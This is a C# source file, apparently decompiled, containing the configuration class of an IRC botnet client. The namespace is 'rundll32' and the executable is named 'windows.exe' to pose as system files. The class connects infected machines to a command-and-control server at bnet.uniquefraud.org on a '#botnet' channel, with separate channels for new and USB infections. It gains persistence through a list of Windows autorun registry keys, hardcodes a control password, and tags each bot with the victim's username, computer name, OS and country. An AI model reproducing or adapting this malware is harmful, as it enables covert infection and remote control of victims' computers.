using System;
using System.Windows.Forms;

namespace rundll32;

internal class config
{
	public static string version = "v0.1";

	public static string host = "bnet.uniquefraud.org";

	public static int port = 6667;

	public static string pass = null;

	public static string prefixC = "|";

	public static string manualC = "M";

	public static string newC = "N";

	public static string usbC = "U";

	public static string nick = "[%os%|%country%|%rand%|%c%]";

	public static string user = "Merqy[%user%@%pc%]";

	public static string mutex = "{HaveANiceDay-TeamMerqy}";

	public static string[] keys = new string[12]
	{
		"Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce", "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx", "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify", "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",
		"Software\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad", "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler"
	};

	public static string[][] dirs = new string[1][] { new string[2]
	{
		Environment.GetEnvironmentVariable("APPDATA"),
		""
	} };

	public static string[][] names = new string[1][] { new string[2] { "windows.exe", "Windows" } };

	public static string channel = "#botnet";

	public static string channelPwd = null;

	public static string[][] onConnChannels = new string[2][]
	{
		new string[2] { channel, channelPwd },
		new string[2]
		{
			channel + ".%country%",
			channelPwd
		}
	};

	public static string[][] onNewInfectionChannels = new string[1][] { new string[2]
	{
		channel + ".new",
		channelPwd
	} };

	public static string[][] onUsbInfectionChannels = new string[1][] { new string[2]
	{
		channel + ".usb",
		channelPwd
	} };

	public static string pwd = "sani_one";

	public static string loginPwd = pwd;

	public static string remPwd = pwd;

	public static string updatePwd = pwd;

	public static string ftp_host = "";

	public static int ftp_port = 21;

	public static string ftp_user = "";

	public static string ftp_pass = "";

	public static string ftp_path = "";

	public static int im_msn_interval = 5000;

	public static void loadVars()
	{
		functionParser.Variables.Add(new functionVariable("false", false));
		functionParser.Variables.Add(new functionVariable("true", true));
		functionParser.Variables.Add(new functionVariable("False", false));
		functionParser.Variables.Add(new functionVariable("True", true));
		functionParser.Variables.Add(new functionVariable("ver", version));
		string text = "";
		if (Program.firstRun)
		{
			text += newC;
		}
		if (Program.usbRun)
		{
			text += usbC;
		}
		if (text == "")
		{
			text += manualC;
		}
		string loc = misc.getLoc();
		string oS = misc.getOS();
		string computerName = SystemInformation.get_ComputerName();
		string userName = Environment.UserName;
		nick = nick.Replace("%country%", loc).Replace("%os%", oS).Replace("%user%", userName)
			.Replace("%pc%", computerName)
			.Replace("%c%", text);
		user = user.Replace("%country%", loc).Replace("%os%", oS).Replace("%user%", userName)
			.Replace("%pc%", computerName)
			.Replace("%c%", text);
		string[][] array = onConnChannels;
		foreach (string[] array2 in array)
		{
			array2[0] = array2[0].Replace("%country%", loc);
		}
	}
}
